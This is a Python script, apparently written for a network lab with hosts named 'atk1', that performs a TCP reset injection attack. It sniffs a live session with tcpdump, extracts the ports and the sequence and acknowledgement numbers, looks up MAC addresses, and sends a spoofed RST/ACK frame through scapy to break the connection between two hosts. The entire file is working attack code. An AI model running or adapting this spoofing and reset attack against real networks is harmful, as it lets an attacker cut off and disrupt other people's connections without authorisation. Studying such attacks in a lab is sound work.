#!/usr/bin/env python

import termcolor as T # grey red green yellow blue magenta cyan white
import os
import sys
import ctypes

from subprocess import Popen, PIPE
from scapy.all import *


SOURCE_ADDRESS = '9.0.1.2'
DESTINATION_ADDRESS = '9.0.1.1'


def log(s, col="green"):
	print T.colored(s, col)


def send_rst_packet(srcMac, dstMac, srcIP, srcPort, dstIP, dstPort, seqNum, ackNum):
	log('sending RST packet\n%s:%s -> %s:%s SN %s AN %s' % (srcIP, srcPort, dstIP, dstPort, seqNum, ackNum), 'red')

	tcp = TCP(flags="RA")
	tcp.dport=int(srcPort)
	tcp.sport=int(dstPort)
	tcp.seq=int(seqNum)
	tcp.ack=int(ackNum)

	spoofed_packet = IP(dst=dstIP, src=srcIP, ttl=1)/tcp

	frame = Ether(src=srcMac, dst=dstMac)/spoofed_packet

	frame.display()

	sendp(frame, iface='atk1-eth0')


def extract_address_port(value):
	values = value.split('.')

	address = values[0] + '.' + values[1] + '.' + values[2] + '.' + values[3]

	port = values[4]

	return address, port


def extract_ports_and_numbers(row):
	print row

	srcPort, dstPort, seqNum, ackNum = None, None, None, None

	values = row.split(' ')

	a = values[2].split('.')
	srcAddr = '.'.join(a[0:4])

	b = values[4].replace(':', '').split('.')
	dstAddr = '.'.join(b[0:4])

	if srcAddr == SOURCE_ADDRESS and dstAddr == DESTINATION_ADDRESS and values[7] == 'seq':
		srcPort = a[4]
		dstPort = b[4]

		values[8] = values[8].replace(',', '')

		if ':' in values[8]:
			seqNum = values[8].split(':')[1]
		else:
			seqNum = values[8]

		ackNum = values[10].replace(',', '')

	return srcPort, dstPort, seqNum, ackNum


def retrieve_atk1_mac_address(iface):
	p = Popen(('ifconfig'), stdout=PIPE)

	for row in iter(p.stdout.readline, b''):
		if iface in row:
			values = row.split(' ')

			p.kill()

			return values[5]

	p.kill()

	return None


def extract_r2_mac_addresses(row):
	values = row.split(' ')

	if '9.0.0.2' in values[9]:
		return values[1].replace(',','')

	if '9.0.0.2' in values[11]:
		return values[3].replace(',','')

	return None


def retrieve_r2_mac_address():
	p = Popen(('sudo', 'tcpdump', '-i', 'atk1-eth0', '-lnSe'), stdout=PIPE)

	r2_mac_address = None

	for row in iter(p.stdout.readline, b''):
		r2_mac_address = extract_r2_mac_addresses(row)

		if r2_mac_address != None:
			break

	p.kill()

	return r2_mac_address


def retrieve_ports_and_numbers():
	p = Popen(('sudo', 'tcpdump', '-i', 'atk1-eth1', '-lnS'), stdout=PIPE)

	srcPort, dstPort, seqNum, ackNum = None, None, None, None

	for row in iter(p.stdout.readline, b''):
		srcPort, dstPort, seqNum, ackNum = extract_ports_and_numbers(row)

		if srcPort and dstPort and seqNum and ackNum:
			p.kill()

			return srcPort, dstPort, seqNum, ackNum

		srcPort, dstPort, seqNum, ackNum = None, None, None, None


def main():
	src_mac_address = retrieve_atk1_mac_address('atk1-eth0')
	print 'source MAC address', src_mac_address

	dst_mac_address = retrieve_r2_mac_address()
	print 'destination MAC address', dst_mac_address

	srcPort, dstPort, seqNum, ackNum = retrieve_ports_and_numbers()
	print srcPort, dstPort
	print seqNum, ackNum

	send_rst_packet(src_mac_address, dst_mac_address, SOURCE_ADDRESS, srcPort, DESTINATION_ADDRESS, dstPort, seqNum, ackNum)


if __name__ == "__main__":
	main()
